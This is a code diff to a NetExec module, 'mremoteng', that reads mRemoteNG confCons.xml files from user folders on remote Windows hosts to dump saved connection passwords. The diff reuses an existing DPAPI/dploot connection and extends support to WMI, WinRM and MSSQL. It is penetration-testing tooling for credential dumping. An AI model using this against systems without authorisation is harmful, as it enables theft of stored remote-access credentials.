@@ -1,12 +1,10 @@
 import ntpath
-from dploot.lib.target import Target
 from Cryptodome.Cipher import AES
 from lxml import objectify
 from base64 import b64decode
 import hashlib
 from dataclasses import dataclass
 from nxc.helpers.misc import CATEGORY
-from nxc.protocols.smb.dpapi import upgrade_to_dploot_connection
 
 
 @dataclass
@@ -25,7 +23,7 @@ class NXCModule:
 
     name = "mremoteng"
     description = "Dump mRemoteNG Passwords in AppData and in Desktop / Documents folders (digging recursively in them) "
-    supported_protocols = ["smb"]
+    supported_protocols = ["smb","wmi","winrm","mssql"]
     category = CATEGORY.CREDENTIAL_DUMPING
 
     def __init__(self, context=None, module_options=None):
@@ -68,69 +66,30 @@ class NXCModule:
             self.custom_path = module_options["CUSTOM_PATH"]
 
     def on_admin_login(self, context, connection):
-        # 1. Evole conn into dploot conn
         self.context = context
         self.connection = connection
-        self.share = connection.args.share
+        self.share = connection.args.share if hasattr(connection.args,"share") else "C$"
+        self.dploot_conn = connection.dpapi_triage.conn
+        
+        users = self.dploot_conn.list_users()
 
-        host = f"{connection.hostname}.{connection.domain}"
-        domain = connection.domain
-        username = connection.username
-        kerberos = connection.kerberos
-        aesKey = connection.aesKey
-        use_kcache = getattr(connection, "use_kcache", False)
-        password = getattr(connection, "password", "")
-        lmhash = getattr(connection, "lmhash", "")
-        nthash = getattr(connection, "nthash", "")
-
-        target = Target.create(
-            domain=domain,
-            username=username,
-            password=password,
-            target=host,
-            lmhash=lmhash,
-            nthash=nthash,
-            do_kerberos=kerberos,
-            aesKey=aesKey,
-            use_kcache=use_kcache,
-        )
-
-        dploot_conn = upgrade_to_dploot_connection(connection=connection.conn, target=target)
-        if dploot_conn is None:
-            context.log.debug("Could not upgrade connection")
-            return
-
-        # 2. Dump users list
-        users = self.get_users(dploot_conn)
-
-        # 3. Search for mRemoteNG files
+        # Search for mRemoteNG files
         for user in users:
             for path in self.mRemoteNg_path:
                 user_path = ntpath.join(path.format(username=user), "confCons.xml")
-                content = dploot_conn.readFile(self.share, user_path)
+                content = self.dploot_conn.read_file(share=self.share, path=user_path)
                 if content is None:
                     continue
                 self.context.log.info(f"Found confCons.xml file: {user_path}")
                 self.handle_confCons_file(content)
             for path in self.custom_user_path:
                 user_path = path.format(username=user)
-                self.dig_confCons_in_files(conn=dploot_conn, directory_path=user_path, recurse_level=0, recurse_max=self.recurse_max)
+                self.dig_confCons_in_files(conn=self.dploot_conn, directory_path=user_path, recurse_level=0, recurse_max=self.recurse_max)
         if self.custom_path is not None:
-            content = dploot_conn.readFile(self.share, self.custom_path)
+            content = self.dploot_conn.read_file(share=self.share, path=self.custom_path)
             if content is not None:
                 self.context.log.info(f"Found confCons.xml file: {self.custom_path}")
                 self.handle_confCons_file(content)
-
-    def get_users(self, conn):
-        users = []
-
-        users_dir_path = "Users\\*"
-        directories = conn.listPath(shareName=self.share, path=ntpath.normpath(users_dir_path))
-
-        for d in directories:
-            if d.get_longname() not in self.false_positive and d.is_directory() > 0:
-                users.append(d.get_longname())  # noqa: PERF401, ignoring for readability
-        return users
 
     def handle_confCons_file(self, file_content):
         main = objectify.fromstring(file_content)
@@ -166,7 +125,7 @@ class NXCModule:
         return nodes
 
     def dig_confCons_in_files(self, conn, directory_path, recurse_level=0, recurse_max=10):
-        directory_list = conn.remote_list_dir(self.share, directory_path)
+        directory_list = conn.list_dir(share=self.share, path=directory_path)
         if directory_list is not None:
             for item in directory_list:
                 if item.get_longname() not in self.false_positive:
@@ -178,7 +137,7 @@ class NXCModule:
                         # It's a file, download it to the output share if the mask is ok
                         if "confCons.xml" in item.get_longname():
                             self.context.log.info(f"Found confCons.xml file: {new_path}")
-                            content = conn.readFile(self.context.share, new_path)
+                            content = conn.read_file(share=self.share, path=new_path)
                             self.handle_confCons_file(content)
 
     def extract_remoteng_passwords(self, encrypted_password, encryption_attributes: MRemoteNgEncryptionAttributes):
